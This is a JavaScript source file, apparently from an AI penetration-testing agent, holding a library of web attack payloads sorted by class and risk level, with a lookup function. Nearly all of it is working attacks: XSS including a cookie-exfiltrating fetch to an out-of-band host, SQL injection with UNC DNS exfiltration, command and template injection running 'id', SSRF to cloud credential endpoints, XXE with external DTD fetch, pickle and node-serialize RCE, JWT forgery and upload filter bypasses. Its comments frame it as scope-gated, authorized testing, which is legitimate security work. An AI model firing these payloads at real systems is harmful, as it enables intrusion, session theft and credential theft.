// ============================================================================
// Web-vulnerability payload library — authorized, scope-gated pentest use only.
// ============================================================================
//
// Every probe is DETECTION / CONFIRMATION oriented and non-destructive:
//  - RCE classes confirm with `id`/`whoami`/OOB DNS, never reverse shells.
//  - SQLi never mutates data (no DROP/DELETE/UPDATE/TRUNCATE).
//  - No DoS/ReDoS/zip/billion-laughs, no mass-targeting, no data destruction.
// Firing is still gated by scope.mjs (Rules of Engagement) + policy.mjs. Use
// only against targets you are authorized to test.
//
// Each entry carries metadata so the agent can pick smartly:
//   { payload, description, expectedResult, riskLevel, vectorType }
// riskLevel ∈ LOW | MEDIUM | HIGH | CRITICAL.
//
// Blind / out-of-band probes interact with an operator-controlled collaborator
// host. Set it in .env.local:  OOB_COLLABORATOR=your-collab.example.com
// (default is a placeholder so nothing phones a live host by accident).

const OOB =
  (process.env.OOB_COLLABORATOR || process.env.OOB_HOST || "oob.pentest.local")
    .trim()
    .replace(/[^a-z0-9.-]/gi, "") || "oob.pentest.local";

/**
 * @typedef {object} PayloadEntry
 * @property {string} payload
 * @property {string} description
 * @property {string} expectedResult
 * @property {"LOW"|"MEDIUM"|"HIGH"|"CRITICAL"} riskLevel
 * @property {string} vectorType
 */

const M = "MEDIUM";
const H = "HIGH";
const C = "CRITICAL";

/** @type {Record<string, PayloadEntry[]>} */
export const PAYLOADS = {
  // ── XSS: reflected/stored/DOM, WAF bypass, polyglots, encoding ladder ──────
  xss: [
    { payload: "<script>alert(9173)</script>", description: "Baseline reflected script tag.", expectedResult: "alert(9173) fires / marker reflected unescaped.", riskLevel: M, vectorType: "Reflected XSS" },
    { payload: "\"><svg/onload=alert(9173)>", description: "Attribute breakout + SVG onload.", expectedResult: "SVG renders and executes JS.", riskLevel: H, vectorType: "Reflected XSS" },
    { payload: "<img src=x onerror=alert(9173)>", description: "Broken image onerror handler.", expectedResult: "onerror runs after load failure.", riskLevel: H, vectorType: "Reflected/Stored XSS" },
    { payload: "<svg/onload=eval(atob('YWxlcnQoOTE3Myk='))>", description: "Base64 eval to dodge keyword filters.", expectedResult: "Decoded alert(9173) executes.", riskLevel: H, vectorType: "WAF Bypass XSS" },
    { payload: "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(9173)>", description: "Context-breaking polyglot across many sinks.", expectedResult: "Executes in at least one injection context.", riskLevel: H, vectorType: "Polyglot XSS" },
    { payload: "<iframe srcdoc=\"&lt;script&gt;parent.alert(9173)&lt;/script&gt;\"></iframe>", description: "srcdoc with entity-encoded script.", expectedResult: "Nested doc runs script in parent.", riskLevel: H, vectorType: "WAF Bypass XSS" },
    { payload: "<details open ontoggle=alert(9173)>", description: "Autofiring ontoggle, no script tag.", expectedResult: "ontoggle fires on render.", riskLevel: M, vectorType: "Reflected XSS" },
    { payload: "<xss onpointerover=alert(9173) style=display:block>MOVE", description: "Event handler on unknown tag.", expectedResult: "Fires on pointer interaction.", riskLevel: M, vectorType: "Stored XSS" },
    { payload: "%253Cscript%253Ealert(9173)%253C%252Fscript%253E", description: "Double-URL-encoded script (encoding ladder).", expectedResult: "Decoded twice server-side then rendered.", riskLevel: M, vectorType: "WAF Bypass XSS" },
    { payload: "<script>fetch(`//${OOB}/x?c=`+btoa(document.cookie))</script>".replace("${OOB}", OOB), description: "Cookie beacon to the OOB collaborator (session theft PoC).", expectedResult: `Encoded document.cookie hits ${OOB}.`, riskLevel: C, vectorType: "XSS Exfiltration" },
    { payload: "{{constructor.constructor('alert(9173)')()}}", description: "Client-side template (Angular/Vue) sandbox escape.", expectedResult: "Framework evaluates and runs JS.", riskLevel: H, vectorType: "CSTI" },
  ],

  // ── SQL injection: union/error/boolean/time/OOB (non-destructive) ─────────
  sqli: [
    { payload: "'", description: "Single-quote error probe.", expectedResult: "SQL error / behavior change.", riskLevel: M, vectorType: "Error-based SQLi" },
    { payload: "' OR '1'='1'-- -", description: "Tautology auth/WHERE bypass.", expectedResult: "Unconstrained rows returned.", riskLevel: H, vectorType: "Auth Bypass SQLi" },
    { payload: "' UNION SELECT NULL,version(),user(),database()-- -", description: "UNION metadata extraction.", expectedResult: "Version/user/db reflected in output.", riskLevel: C, vectorType: "UNION SQLi" },
    { payload: "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -", description: "Error-based exfil via XPath error.", expectedResult: "Version leaked in error message.", riskLevel: C, vectorType: "Error-based SQLi" },
    { payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", description: "Double-query duplicate-key error extraction.", expectedResult: "Version leaked via duplicate entry error.", riskLevel: C, vectorType: "Error-based SQLi" },
    { payload: "1' AND (SELECT 9173 FROM (SELECT(SLEEP(5)))a)-- -", description: "MySQL time-based blind.", expectedResult: "~5s delayed response.", riskLevel: H, vectorType: "Blind Time SQLi" },
    { payload: "1);SELECT pg_sleep(5)-- -", description: "PostgreSQL stacked time probe.", expectedResult: "~5s delay (Postgres).", riskLevel: H, vectorType: "Blind Time SQLi" },
    { payload: "1';WAITFOR DELAY '0:0:5'-- -", description: "MSSQL time-based blind.", expectedResult: "~5s delay (MSSQL).", riskLevel: H, vectorType: "Blind Time SQLi" },
    { payload: "' AND 1=2 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.${OOB}\\\\a'))-- -".replace("${OOB}", OOB), description: "OOB exfil via Windows UNC DNS (MySQL FILE priv).", expectedResult: `Subdomain lookup for <version>.${OOB}.`, riskLevel: C, vectorType: "OOB SQLi" },
    { payload: "%27%20OR%201%3D1--%20-", description: "URL-encoded tautology (encoding ladder).", expectedResult: "Decoded then injected.", riskLevel: M, vectorType: "WAF Bypass SQLi" },
    { payload: "/*!50000 OR*/ 1=1-- -", description: "MySQL versioned-comment keyword smuggling.", expectedResult: "Comment executed as SQL by MySQL.", riskLevel: M, vectorType: "WAF Bypass SQLi" },
  ],

  // ── NoSQL injection (Mongo operators / JS) ────────────────────────────────
  nosqli: [
    { payload: "{\"$ne\":null}", description: "Operator injection matching any value.", expectedResult: "Auth/filter bypassed.", riskLevel: H, vectorType: "NoSQL Operator Injection" },
    { payload: "{\"$gt\":\"\"}", description: "Greater-than empty string match-all.", expectedResult: "Returns all records.", riskLevel: H, vectorType: "NoSQL Operator Injection" },
    { payload: "{\"$regex\":\".*\",\"$options\":\"i\"}", description: "Regex wildcard match / blind extraction.", expectedResult: "Matches arbitrary values.", riskLevel: H, vectorType: "NoSQL Blind" },
    { payload: "username[$ne]=x&password[$ne]=x", description: "Form-encoded operator auth bypass.", expectedResult: "Login without valid creds.", riskLevel: C, vectorType: "NoSQL Auth Bypass" },
    { payload: "';return true;var _='", description: "$where JavaScript injection to always-true.", expectedResult: "Server-side JS evaluates true.", riskLevel: C, vectorType: "NoSQL JS Injection" },
    { payload: "{\"$where\":\"sleep(5000)\"}", description: "Blind time probe via $where sleep.", expectedResult: "~5s delay.", riskLevel: H, vectorType: "NoSQL Blind Time" },
  ],

  // ── OS command injection: confirm with id/OOB, blind time (non-destructive) ─
  command_injection: [
    { payload: "; id", description: "Separator + identity probe.", expectedResult: "uid=... in response.", riskLevel: C, vectorType: "OS Command Injection" },
    { payload: "| whoami", description: "Pipe to whoami.", expectedResult: "Current user echoed.", riskLevel: C, vectorType: "OS Command Injection" },
    { payload: "$(id)", description: "Command substitution.", expectedResult: "id output embedded.", riskLevel: C, vectorType: "RCE" },
    { payload: "`uname -a`", description: "Backtick kernel/version probe.", expectedResult: "Kernel string returned.", riskLevel: H, vectorType: "RCE" },
    { payload: "; sleep 5", description: "Blind time confirmation.", expectedResult: "~5s delay.", riskLevel: H, vectorType: "Blind Command Injection" },
    { payload: "& nslookup ${OOB} &".replace("${OOB}", OOB), description: "Blind OOB DNS confirmation.", expectedResult: `DNS lookup for ${OOB} observed.`, riskLevel: C, vectorType: "OOB Command Injection" },
    { payload: "%0a id %0a", description: "Newline-separated injection (filter bypass).", expectedResult: "id runs on a new line.", riskLevel: H, vectorType: "WAF Bypass CMDi" },
    { payload: "|| id ||", description: "OR-chained execution for Windows/Unix.", expectedResult: "id runs when prior fails.", riskLevel: H, vectorType: "OS Command Injection" },
  ],

  // ── SSTI: RCE confirmation across engines + detection ─────────────────────
  ssti: [
    { payload: "${7*7}", description: "Detection probe (FreeMarker/JSP EL style).", expectedResult: "Renders 49.", riskLevel: M, vectorType: "SSTI Detection" },
    { payload: "{{7*7}}", description: "Detection probe (Jinja2/Twig).", expectedResult: "Renders 49.", riskLevel: M, vectorType: "SSTI Detection" },
    { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", description: "Jinja2 globals RCE confirmation.", expectedResult: "id output in response.", riskLevel: C, vectorType: "SSTI RCE (Python)" },
    { payload: "{{['id']|filter('system')}}", description: "Twig filter(system) RCE.", expectedResult: "id output in response.", riskLevel: C, vectorType: "SSTI RCE (Twig)" },
    { payload: "#{T(java.lang.Runtime).getRuntime().exec('id')}", description: "Spring SpEL Runtime.exec.", expectedResult: "Command executes (blind).", riskLevel: C, vectorType: "SSTI RCE (Java)" },
    { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", description: "FreeMarker Execute utility RCE.", expectedResult: "id output in response.", riskLevel: C, vectorType: "SSTI RCE (FreeMarker)" },
    { payload: "<%= `id` %>", description: "Ruby ERB command execution.", expectedResult: "id output rendered.", riskLevel: C, vectorType: "SSTI RCE (Ruby)" },
    { payload: "{{''.__class__.__mro__[2].__subclasses__()}}", description: "Python object graph recon (pre-RCE).", expectedResult: "Subclass list leaks.", riskLevel: H, vectorType: "SSTI Recon (Python)" },
  ],

  // ── Path traversal / LFI: depth, encoding ladder, wrappers ────────────────
  path_traversal: [
    { payload: "../../../../../../etc/passwd", description: "Deep Unix traversal.", expectedResult: "passwd contents.", riskLevel: H, vectorType: "LFI" },
    { payload: "..%2f..%2f..%2f..%2fetc%2fpasswd", description: "URL-encoded slashes.", expectedResult: "passwd via encoded path.", riskLevel: H, vectorType: "WAF Bypass LFI" },
    { payload: "..%252f..%252f..%252fetc%252fpasswd", description: "Double-encoded (encoding ladder).", expectedResult: "Decoded twice → traversal.", riskLevel: H, vectorType: "WAF Bypass LFI" },
    { payload: "....//....//....//etc/passwd", description: "Nested-dot filter evasion.", expectedResult: "Collapses to traversal.", riskLevel: H, vectorType: "WAF Bypass LFI" },
    { payload: "..%c0%af..%c0%af..%c0%afetc/passwd", description: "Overlong UTF-8 slash.", expectedResult: "Decoded to '/'.", riskLevel: M, vectorType: "WAF Bypass LFI" },
    { payload: "..\\..\\..\\..\\windows\\win.ini", description: "Windows traversal.", expectedResult: "win.ini contents.", riskLevel: H, vectorType: "LFI (Windows)" },
    { payload: "php://filter/convert.base64-encode/resource=index.php", description: "PHP wrapper source disclosure.", expectedResult: "Base64 source returned.", riskLevel: H, vectorType: "Wrapper Abuse" },
    { payload: "data://text/plain;base64,PD9waHAgZWNobyA5MTczOz8+", description: "data:// wrapper code exec probe.", expectedResult: "Echoes 9173 if include+data allowed.", riskLevel: H, vectorType: "Wrapper RCE" },
    { payload: "/proc/self/environ", description: "Env disclosure / log-poisoning target.", expectedResult: "Process environment leaks.", riskLevel: M, vectorType: "LFI" },
  ],

  // ── SSRF: localhost, cloud metadata, schemes, IP obfuscation, OOB ─────────
  ssrf: [
    { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "AWS IMDS credential path.", expectedResult: "IAM role creds returned.", riskLevel: C, vectorType: "SSRF Cloud Metadata (AWS)" },
    { payload: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", description: "GCP metadata (needs Metadata-Flavor header).", expectedResult: "Instance metadata returned.", riskLevel: C, vectorType: "SSRF Cloud Metadata (GCP)" },
    { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", description: "Azure IMDS.", expectedResult: "Azure instance metadata.", riskLevel: C, vectorType: "SSRF Cloud Metadata (Azure)" },
    { payload: "http://127.0.0.1:6379/", description: "Internal Redis reachability.", expectedResult: "Redis banter / error.", riskLevel: H, vectorType: "SSRF Internal" },
    { payload: "http://2130706433/", description: "Decimal-encoded 127.0.0.1 (filter bypass).", expectedResult: "Resolves to localhost.", riskLevel: H, vectorType: "WAF Bypass SSRF" },
    { payload: "http://0177.0.0.1/", description: "Octal-encoded localhost.", expectedResult: "Resolves to localhost.", riskLevel: M, vectorType: "WAF Bypass SSRF" },
    { payload: "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall", description: "Gopher Redis interaction probe (non-destructive detection of gopher support).", expectedResult: "Gopher scheme accepted.", riskLevel: H, vectorType: "SSRF Gopher" },
    { payload: "http://${OOB}/ssrf".replace("${OOB}", OOB), description: "OOB reachability canary.", expectedResult: `HTTP hit on ${OOB}.`, riskLevel: H, vectorType: "OOB SSRF" },
    { payload: "file:///etc/passwd", description: "file:// scheme local read.", expectedResult: "passwd via file scheme.", riskLevel: H, vectorType: "SSRF file://" },
  ],

  // ── XXE: file read, OOB, parameter entities, XInclude, SVG ────────────────
  xxe: [
    { payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", description: "Classic external entity file read.", expectedResult: "passwd in response.", riskLevel: C, vectorType: "XXE File Read" },
    { payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://${OOB}/xxe\">]><r>&x;</r>".replace("${OOB}", OOB), description: "OOB entity for blind XXE.", expectedResult: `Callback to ${OOB}.`, riskLevel: C, vectorType: "Blind XXE (OOB)" },
    { payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://${OOB}/evil.dtd\"> %p;]>".replace("${OOB}", OOB), description: "Parameter-entity DTD fetch for blind exfil.", expectedResult: `External DTD pulled from ${OOB}.`, riskLevel: C, vectorType: "Blind XXE (Param Entity)" },
    { payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", description: "XXE + PHP filter for binary-safe read.", expectedResult: "Base64 of passwd.", riskLevel: H, vectorType: "XXE Wrapper" },
    { payload: "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></r>", description: "XInclude when DOCTYPE is blocked.", expectedResult: "passwd included.", riskLevel: H, vectorType: "XInclude" },
    { payload: "<svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE svg [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><text>&x;</text></svg>", description: "XXE via SVG upload/parse.", expectedResult: "hostname rendered in SVG.", riskLevel: H, vectorType: "XXE (SVG)" },
  ],

  // ── Deserialization (PoC signatures — need a gadget in the target) ────────
  deserialization: [
    { payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACAAFMAApncm91cERhdGF0AHJMTGphdmEvbGFuZy9TdHJpbmc7eHB0AAZhZG1pbg==", description: "Java serialized object (base64) — detects Java deser sink.", expectedResult: "Server attempts Java deserialization.", riskLevel: H, vectorType: "Java Deserialization" },
    { payload: "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:7:\"isAdmin\";b:1;}", description: "PHP object injection with elevated props.", expectedResult: "__wakeup/gadget triggered.", riskLevel: H, vectorType: "PHP Object Injection" },
    { payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}", description: "Node node-serialize IIFE RCE confirmation.", expectedResult: "id executes on unserialize.", riskLevel: C, vectorType: "Node Deserialization RCE" },
    { payload: "cos\nsystem\n(S'id'\ntR.", description: "Python pickle reduce → system('id').", expectedResult: "id runs on pickle load.", riskLevel: C, vectorType: "Python Pickle RCE" },
  ],

  // ── LDAP injection ────────────────────────────────────────────────────────
  ldap: [
    { payload: "*)(uid=*))(|(uid=*", description: "Filter breakout match-all.", expectedResult: "Returns all directory entries.", riskLevel: H, vectorType: "LDAP Injection" },
    { payload: "*)(|(objectClass=*))", description: "Enumerate all objects.", expectedResult: "Object listing leaks.", riskLevel: H, vectorType: "LDAP Enumeration" },
    { payload: "admin)(&)", description: "Always-true auth bypass.", expectedResult: "Login as admin.", riskLevel: C, vectorType: "LDAP Auth Bypass" },
    { payload: "*", description: "Wildcard presence probe.", expectedResult: "Unfiltered matches.", riskLevel: M, vectorType: "LDAP Injection" },
  ],

  // ── XPath injection ───────────────────────────────────────────────────────
  xpath: [
    { payload: "' or '1'='1", description: "Tautology auth bypass.", expectedResult: "Returns all nodes.", riskLevel: H, vectorType: "XPath Auth Bypass" },
    { payload: "'] | //user/*[contains(*,'a')] | //['", description: "Node extraction breakout.", expectedResult: "Leaks user nodes.", riskLevel: H, vectorType: "XPath Injection" },
    { payload: "' and string-length(name(/*[1]))>0 and ''='", description: "Blind boolean structure probe.", expectedResult: "Boolean differential response.", riskLevel: M, vectorType: "Blind XPath" },
  ],

  // ── CRLF / HTTP response splitting / header injection ─────────────────────
  crlf: [
    { payload: "%0d%0aSet-Cookie:pentest=9173", description: "Inject a response header.", expectedResult: "Set-Cookie appears in response.", riskLevel: H, vectorType: "CRLF Injection" },
    { payload: "%0d%0aLocation:https://${OOB}/".replace("${OOB}", OOB), description: "Header injection → open redirect to OOB.", expectedResult: `Redirect to ${OOB}.`, riskLevel: H, vectorType: "Response Splitting" },
    { payload: "%E5%98%8A%E5%98%8DX-Injected:9173", description: "Unicode-encoded CRLF (filter bypass).", expectedResult: "Header injected via unicode newline.", riskLevel: M, vectorType: "WAF Bypass CRLF" },
    { payload: "%0d%0a%0d%0a<script>alert(9173)</script>", description: "Split body → reflected XSS.", expectedResult: "Injected body executes.", riskLevel: H, vectorType: "Response Splitting XSS" },
  ],

  // ── Open redirect ─────────────────────────────────────────────────────────
  open_redirect: [
    { payload: "//${OOB}".replace("${OOB}", OOB), description: "Scheme-relative redirect.", expectedResult: `Redirects to ${OOB}.`, riskLevel: M, vectorType: "Open Redirect" },
    { payload: "https://trusted.local@${OOB}/".replace("${OOB}", OOB), description: "Userinfo trick past naive host checks.", expectedResult: `Lands on ${OOB}.`, riskLevel: M, vectorType: "Open Redirect Bypass" },
    { payload: "/%2f%2f${OOB}%2f".replace("${OOB}", OOB), description: "Encoded double-slash bypass.", expectedResult: `Redirects to ${OOB}.`, riskLevel: M, vectorType: "WAF Bypass Redirect" },
    { payload: "https:${OOB}".replace("${OOB}", OOB), description: "Missing-slash scheme confusion.", expectedResult: `Browser normalizes to ${OOB}.`, riskLevel: M, vectorType: "Open Redirect Bypass" },
  ],

  // ── File upload (weak filter detection) ───────────────────────────────────
  file_upload: [
    { payload: "shell.php", description: "Direct PHP extension.", expectedResult: "Executable upload accepted.", riskLevel: C, vectorType: "Unrestricted Upload" },
    { payload: "shell.php.jpg", description: "Double extension.", expectedResult: "Served/executed as PHP.", riskLevel: H, vectorType: "Upload Filter Bypass" },
    { payload: "shell.pHp", description: "Case variation.", expectedResult: "Bypasses case-sensitive blocklist.", riskLevel: H, vectorType: "Upload Filter Bypass" },
    { payload: "shell.phtml", description: "Alternate PHP handler extension.", expectedResult: "Executed by PHP handler.", riskLevel: H, vectorType: "Upload Filter Bypass" },
    { payload: "shell.php%00.jpg", description: "Null-byte truncation (legacy).", expectedResult: "Saved as .php.", riskLevel: H, vectorType: "Upload Filter Bypass" },
    { payload: "GIF89a;<?php echo 9173; ?>", description: "Magic-byte polyglot content.", expectedResult: "Passes image check, runs PHP.", riskLevel: H, vectorType: "Upload Polyglot" },
    { payload: ".htaccess", description: "Handler override upload.", expectedResult: "Maps new exts to PHP.", riskLevel: H, vectorType: "Upload Config Abuse" },
    { payload: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(9173)\"/>", description: "SVG with script → stored XSS.", expectedResult: "XSS when SVG viewed.", riskLevel: H, vectorType: "Upload Stored XSS" },
  ],

  // ── JWT attacks ───────────────────────────────────────────────────────────
  jwt: [
    { payload: "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.", description: "alg:none unsigned admin token.", expectedResult: "Server accepts unsigned token.", riskLevel: C, vectorType: "JWT alg:none" },
    { payload: "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}", description: "kid path traversal → predictable key.", expectedResult: "Verifies against empty/known key.", riskLevel: H, vectorType: "JWT kid Injection" },
    { payload: "{\"alg\":\"HS256\",\"jku\":\"https://${OOB}/jwks.json\"}".replace("${OOB}", OOB), description: "jku points verifier at attacker JWKS.", expectedResult: `Server fetches keys from ${OOB}.`, riskLevel: C, vectorType: "JWT jku SSRF/Spoof" },
    { payload: "alg:RS256->HS256", description: "Algorithm confusion: sign HS256 with public key.", expectedResult: "RSA-verify endpoint accepts HMAC.", riskLevel: C, vectorType: "JWT Alg Confusion" },
  ],

  // ── GraphQL ───────────────────────────────────────────────────────────────
  graphql: [
    { payload: "{__schema{types{name,fields{name}}}}", description: "Full introspection.", expectedResult: "Schema dumped.", riskLevel: H, vectorType: "GraphQL Introspection" },
    { payload: "{__typename}", description: "GraphQL presence probe.", expectedResult: "Confirms GraphQL endpoint.", riskLevel: M, vectorType: "GraphQL Detection" },
    { payload: "query{user(id:\"1\"){name} __proto__{x}}", description: "Field suggestion / error leakage.", expectedResult: "Suggests hidden fields.", riskLevel: M, vectorType: "GraphQL Field Suggestion" },
    { payload: "[{\"query\":\"{a:__typename}\"},{\"query\":\"{b:__typename}\"}]", description: "Batched queries (rate-limit/brute amplification).", expectedResult: "Multiple ops in one request.", riskLevel: M, vectorType: "GraphQL Batching" },
  ],

  // ── Prototype pollution ───────────────────────────────────────────────────
  prototype_pollution: [
    { payload: "{\"__proto__\":{\"isAdmin\":true}}", description: "JSON body proto pollution.", expectedResult: "Object.prototype.isAdmin set.", riskLevel: H, vectorType: "Prototype Pollution" },
    { payload: "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}", description: "constructor.prototype path variant.", expectedResult: "Pollutes prototype.", riskLevel: H, vectorType: "Prototype Pollution" },
    { payload: "__proto__[polluted]=9173", description: "Query/body param pollution.", expectedResult: "polluted reflected on all objects.", riskLevel: M, vectorType: "Prototype Pollution" },
    { payload: "?__proto__[status]=500", description: "Gadget: force app behavior via polluted default.", expectedResult: "App reads polluted default.", riskLevel: M, vectorType: "Prototype Pollution Gadget" },
  ],

  // ── API / auth bypass / access control ────────────────────────────────────
  api_auth_bypass: [
    { payload: "X-Forwarded-For: 127.0.0.1", description: "Spoof trusted source IP.", expectedResult: "IP allowlist bypassed.", riskLevel: H, vectorType: "Access Control Bypass" },
    { payload: "X-Original-URL: /admin", description: "Front-end path ACL bypass.", expectedResult: "Reaches /admin despite block.", riskLevel: H, vectorType: "Access Control Bypass" },
    { payload: "X-HTTP-Method-Override: PUT", description: "Method override past method ACLs.", expectedResult: "PUT executed via POST.", riskLevel: M, vectorType: "Method Override" },
    { payload: "/admin/..;/", description: "Path normalization (Tomcat) bypass.", expectedResult: "Protected path reached.", riskLevel: H, vectorType: "Path Normalization Bypass" },
    { payload: "{\"role\":\"admin\",\"isAdmin\":true}", description: "Mass assignment privilege escalation.", expectedResult: "Elevated props bound.", riskLevel: H, vectorType: "Mass Assignment" },
  ],

  // ── CORS misconfiguration ─────────────────────────────────────────────────
  cors: [
    { payload: "Origin: https://${OOB}".replace("${OOB}", OOB), description: "Reflected arbitrary origin probe.", expectedResult: `ACAO echoes ${OOB} + credentials.`, riskLevel: H, vectorType: "CORS Reflection" },
    { payload: "Origin: null", description: "null origin trust probe.", expectedResult: "ACAO: null with credentials.", riskLevel: M, vectorType: "CORS null Origin" },
  ],
};

import { CUSTOM_PAYLOADS } from "./custom.mjs";

const RISK_ORDER = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };

/** Normalize any entry (string or metadata object) into a full PayloadEntry. */
function normEntry(e, category) {
  if (typeof e === "string") {
    const p = e.trim();
    return p ? { payload: p, description: "", expectedResult: "", riskLevel: M, vectorType: category } : null;
  }
  if (e && typeof e === "object" && typeof e.payload === "string" && e.payload.trim()) {
    return {
      payload: e.payload,
      description: typeof e.description === "string" ? e.description : "",
      expectedResult: typeof e.expectedResult === "string" ? e.expectedResult : "",
      riskLevel: RISK_ORDER[e.riskLevel] ? e.riskLevel : M,
      vectorType: typeof e.vectorType === "string" ? e.vectorType : category,
    };
  }
  return null;
}

/** Merge custom payloads into the built-in set, preserving metadata and
 *  de-duplicating by payload string. Robust to malformed custom entries. */
function mergeCustom(base, custom) {
  /** @type {Record<string, PayloadEntry[]>} */
  const out = {};
  for (const [cat, list] of Object.entries(base)) {
    out[cat] = list.map((e) => normEntry(e, cat)).filter(Boolean);
  }
  if (custom && typeof custom === "object") {
    for (const [cat, list] of Object.entries(custom)) {
      if (!Array.isArray(list)) continue;
      const clean = list.map((e) => normEntry(e, cat)).filter(Boolean);
      if (clean.length === 0 && !out[cat]) continue;
      out[cat] = [...(out[cat] ?? []), ...clean];
    }
  }
  for (const cat of Object.keys(out)) {
    const seen = new Set();
    out[cat] = out[cat].filter((e) => (seen.has(e.payload) ? false : (seen.add(e.payload), true)));
  }
  return out;
}

/** @type {Record<string, PayloadEntry[]>} */
export const ALL_PAYLOADS = mergeCustom(PAYLOADS, CUSTOM_PAYLOADS);
export const CATEGORIES = Object.keys(ALL_PAYLOADS);
export const PAYLOAD_COUNT = Object.values(ALL_PAYLOADS).reduce((n, a) => n + a.length, 0);
export const OOB_HOST = OOB;

/**
 * Fetch payloads for the agent. Read-only; runs nothing.
 * @param {{ category?: string, limit?: number, minRisk?: string }} [opts]
 */
export function getPayloads({ category, limit, minRisk } = {}) {
  const cat = typeof category === "string" ? category.trim().toLowerCase() : "";
  const cap = Number.isInteger(limit) && limit > 0 ? limit : 50;
  const threshold = RISK_ORDER[String(minRisk ?? "").toUpperCase()] ?? 0;

  if (!cat || cat === "all" || cat === "list") {
    return {
      ok: true,
      category: "list",
      count: CATEGORIES.length,
      total: PAYLOAD_COUNT,
      oob: OOB,
      categories: CATEGORIES.map((c) => `${c} (${ALL_PAYLOADS[c].length})`),
      message:
        `Payload library: ${PAYLOAD_COUNT} probes across ${CATEGORIES.length} classes. ` +
        `Call with a category (and optional min_risk LOW|MEDIUM|HIGH|CRITICAL) to get probes ` +
        `ranked by severity. OOB host: ${OOB}. Authorized, in-scope testing only.`,
    };
  }

  const list = ALL_PAYLOADS[cat];
  if (!list) {
    return { ok: false, category: cat, count: 0, total: PAYLOAD_COUNT, message: `Unknown category "${cat}". Available: ${CATEGORIES.join(", ")}.` };
  }

  const ranked = list
    .filter((e) => RISK_ORDER[e.riskLevel] >= threshold)
    .sort((a, b) => RISK_ORDER[b.riskLevel] - RISK_ORDER[a.riskLevel]);

  return {
    ok: true,
    category: cat,
    count: Math.min(cap, ranked.length),
    total: list.length,
    oob: OOB,
    payloads: ranked.slice(0, cap),
  };
}
